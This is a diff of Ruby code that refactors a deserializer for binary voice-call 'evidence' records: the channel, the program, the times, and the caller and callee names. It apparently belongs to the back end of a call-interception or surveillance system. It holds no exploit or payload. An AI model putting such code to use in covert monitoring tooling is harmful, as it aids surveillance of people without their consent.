@@ -19,36 +19,31 @@ module CallEvidence
     
     raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.bytesize == 0
     
-    binary = StringIO.new data
-    version = read_uint32 binary
+    stream = StringIO.new data
+    version = read_uint32 stream
     
     raise EvidenceDeserializeError.new("invalid log version for voice call") unless version == LOG_VOICE_VERSION
     
     ret = Hash.new
     ret[:data] = Hash.new
-    ret[:data][:channel] = CHANNEL[read_uint32 binary]
-    ret[:data][:program] = SOFTWARE[read_uint32 binary]
-    ret[:data][:sample_rate] = read_uint32 binary
-    ret[:data][:incoming] = read_uint32 binary
-    low = read_uint32 binary
-    high = read_uint32 binary
+    channel = read_uint32 stream
+    ret[:data][:channel] = CHANNEL[channel]    
+    ret[:data][:program] = SOFTWARE[read_uint32 stream]
+    ret[:data][:sample_rate] = read_uint32 stream
+    ret[:data][:incoming] = read_uint32 stream
+    low, high = stream.read(8).unpack 'V2'
     ret[:data][:start_time] = Time.from_filetime high, low
-    low = read_uint32 binary
-    high = read_uint32 binary
+    low, high = stream.read(8).unpack 'V2'
     ret[:data][:stop_time] = Time.from_filetime high, low
     
-    caller_len = read_uint32 binary
-    callee_len = read_uint32 binary
+    caller_len = read_uint32 stream
+    callee_len = read_uint32 stream
     
     raise RCS::EvidenceDeserializeError.new("invalid callee") if callee_len == 0
     
-    ret[:data][:caller] ||= binary.read(caller_len).utf16le_to_utf8.lstrip.rstrip if caller_len != 0
-    ret[:data][:peer] ||= binary.read(callee_len).utf16le_to_utf8.lstrip.rstrip if callee_len != 0
+    ret[:data][:caller] ||= stream.read(caller_len).utf16le_to_utf8.lstrip.rstrip if caller_len != 0
+    ret[:data][:peer] ||= stream.read(callee_len).utf16le_to_utf8.lstrip.rstrip if callee_len != 0
     return ret
-  end
-  
-  def end_call?
-    return true if @content.bytesize == 4 and @content == "\xff\xff\xff\xff"
   end
   
   def decode_content(common_info, chunks)
@@ -59,7 +54,6 @@ module CallEvidence
     yield info if block_given?
     :keep_raw
   end
-  
 end
 
 end # RCS::
